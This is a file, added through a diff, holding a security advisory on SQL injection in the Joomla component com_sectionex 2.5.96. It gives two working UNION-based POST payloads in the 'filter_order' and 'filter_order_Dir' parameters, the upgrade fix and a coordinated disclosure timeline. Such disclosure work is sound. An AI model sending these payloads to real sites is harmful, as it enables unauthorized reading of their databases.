@@ -1,0 +1,45 @@
+-------------------------------------------------------------------------------------
+Joomla com_sectionex v2.5.96 SQL Injection vulnerabilities
+-------------------------------------------------------------------------------------
+
+== Description ==
+- Software link: http://stackideas.com/sectionex
+- Affected versions: version 2.5.96 is vulnerable. Other versions
+might be affected as well.
+- Author: Matias Fontanini
+
+== Vulnerabilities ==
+When using the "category" view, the component does not correctly
+sanitize the "filter_order" and "filter_order_Dir" parameters before
+using them to construct SQL queries, making it vulnerable to SQL
+Injection attacks.
+
+In order to exploit these vulnerabilities, an attacker could perform
+requests like the following ones:
+
+- For the "filter_order" parameter:
+
+POST /index.php?option=com_sectionex&view=category&id=X&Itemid=Y
+
+filter_title=&filter_content=&limit=0&sectionid=20&filter_order=1
+limit 1 offset 10000) union all (select
+1,2,3,user(),5,6,7,8,9,10,11,12,13,14,15,16 from
+dual)%23&filter_order_Dir=DESC
+
+- For the "filter_order_Dir" parameter:
+
+POST /index.php?option=com_sectionex&view=category&id=X&Itemid=Y
+
+filter_title=&filter_content=&limit=0&sectionid=20&filter_order=1&filter_order_Dir=DESC
+limit 1 offset 10000) union all (select
+1,2,3,user(),5,6,7,8,9,10,11,12,13,14,15,16 from dual)%23
+
+== Solution ==
+Upgrade the product to the 2.5.104 version.
+
+== Report timeline ==
+[2013-07-30] Vulnerabilities reported to the developers.
+[2013-07-30] Developers answered back indicating that a new release
+would be made soon.
+[2013-08-01] SectionEx 2.5.104 was released, which fixed the issues reported.
+[2013-08-05] Public disclosure.
